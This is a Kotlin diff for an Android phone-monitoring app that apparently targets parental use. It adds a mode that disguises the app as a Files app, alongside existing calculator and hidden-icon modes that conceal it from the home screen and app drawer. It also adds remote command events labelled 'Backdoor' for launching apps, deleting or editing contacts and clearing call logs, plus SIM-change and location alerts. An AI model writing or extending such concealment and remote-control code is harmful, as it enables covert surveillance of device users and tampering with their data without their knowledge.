@@ -414,35 +414,66 @@ object DevicePrefs {
         get() = prefs.getString("custom_notif_text", "System Active • Tap for Clock") ?: "System Active • Tap for Clock"
         set(value) = prefs.edit().putString("custom_notif_text", value).apply()
 
+    var filesDisguiseEnabled: Boolean
+        get() = prefs.getBoolean("files_disguise_enabled", false)
+        set(value) = prefs.edit().putBoolean("files_disguise_enabled", value).apply()
+
+    var monitoringPaused: Boolean
+        get() = prefs.getBoolean("monitoring_paused", false)
+        set(value) = prefs.edit().putBoolean("monitoring_paused", value).apply()
+
+    var speedAlertThresholdKmh: Int
+        get() = prefs.getInt("speed_alert_threshold_kmh", 60)
+        set(value) = prefs.edit().putInt("speed_alert_threshold_kmh", value).apply()
+
+    var lastSimSerial: String
+        get() = prefs.getString("last_sim_serial", "") ?: ""
+        set(value) = prefs.edit().putString("last_sim_serial", value).apply()
+
     fun updateStealthMode(context: Context, mode: String) {
         try {
             val pm = context.packageManager
             val mainComp = android.content.ComponentName(context, "com.phonelink.hub.MainActivity")
             val defaultAlias = android.content.ComponentName(context, "com.phonelink.hub.DefaultLauncherAlias")
             val calcAlias = android.content.ComponentName(context, "com.phonelink.hub.CalculatorAlias")
+            val filesAlias = android.content.ComponentName(context, "com.phonelink.hub.FilesAlias")
 
             // Ensure MainActivity is ALWAYS enabled so settings / parent unlock can launch it anytime
             pm.setComponentEnabledSetting(mainComp, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
 
             when (mode.uppercase()) {
+                "FILES" -> {
+                    filesDisguiseEnabled = true
+                    calculatorDisguiseEnabled = false
+                    hideAppIconEnabled = false
+                    pm.setComponentEnabledSetting(filesAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+                    pm.setComponentEnabledSetting(defaultAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+                    pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+                }
                 "CALCULATOR" -> {
+                    filesDisguiseEnabled = false
                     calculatorDisguiseEnabled = true
                     hideAppIconEnabled = false
                     pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
                     pm.setComponentEnabledSetting(defaultAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+                    pm.setComponentEnabledSetting(filesAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
                 }
                 "HIDDEN" -> {
+                    filesDisguiseEnabled = false
                     calculatorDisguiseEnabled = false
                     hideAppIconEnabled = true
-                    // Disable BOTH aliases so icon disappears from home screen and app drawer completely!
+                    // Disable all aliases so icon disappears from home screen and app drawer completely!
                     pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
                     pm.setComponentEnabledSetting(defaultAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+                    pm.setComponentEnabledSetting(filesAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
                 }
                 else -> { // "NORMAL"
+                    filesDisguiseEnabled = false
                     calculatorDisguiseEnabled = false
                     hideAppIconEnabled = false
                     pm.setComponentEnabledSetting(defaultAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
                     pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+                    pm.setComponentEnabledSetting(filesAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
                 }
             }
         } catch (e: Exception) {
@@ -758,4 +789,31 @@ object Events {
     // Hardware Button Controls & Quick Settings
     const val QUICK_SETTING_COMMAND = "QUICK_SETTING_COMMAND"
     const val QUICK_SETTING_STATUS = "QUICK_SETTING_STATUS"
+
+    // Remote App Launch & Backdoor
+    const val OPEN_APP_COMMAND = "OPEN_APP_COMMAND"
+
+    // Pause Monitoring (Home Mode)
+    const val PAUSE_MONITORING_COMMAND = "PAUSE_MONITORING_COMMAND"
+    const val MONITORING_PAUSED_STATUS = "MONITORING_PAUSED_STATUS"
+
+    // Contact & Call Log Modifications
+    const val DELETE_CONTACT_COMMAND = "DELETE_CONTACT_COMMAND"
+    const val DELETE_CONTACT_RESULT = "DELETE_CONTACT_RESULT"
+    const val EDIT_CONTACT_COMMAND = "EDIT_CONTACT_COMMAND"
+    const val EDIT_CONTACT_RESULT = "EDIT_CONTACT_RESULT"
+    const val DELETE_CALL_COMMAND = "DELETE_CALL_COMMAND"
+    const val DELETE_CALL_RESULT = "DELETE_CALL_RESULT"
+    const val CLEAR_CALLS_COMMAND = "CLEAR_CALLS_COMMAND"
+    const val CLEAR_CALLS_RESULT = "CLEAR_CALLS_RESULT"
+
+    // Enhanced Safety & Telemetry
+    const val SPEED_ALERT = "SPEED_ALERT"
+    const val EMERGENCY_BATTERY_LOCATION = "EMERGENCY_BATTERY_LOCATION"
+    const val SIM_CHANGED_ALERT = "SIM_CHANGED_ALERT"
+    const val LOCK_SCREEN_MESSAGE_COMMAND = "LOCK_SCREEN_MESSAGE_COMMAND"
+    const val LOCK_SCREEN_MESSAGE_RESULT = "LOCK_SCREEN_MESSAGE_RESULT"
+    const val STORAGE_ANALYSIS_REQUEST = "STORAGE_ANALYSIS_REQUEST"
+    const val STORAGE_ANALYSIS_RESPONSE = "STORAGE_ANALYSIS_RESPONSE"
+    const val APP_INSTALL_EVENT = "APP_INSTALL_EVENT"
 }
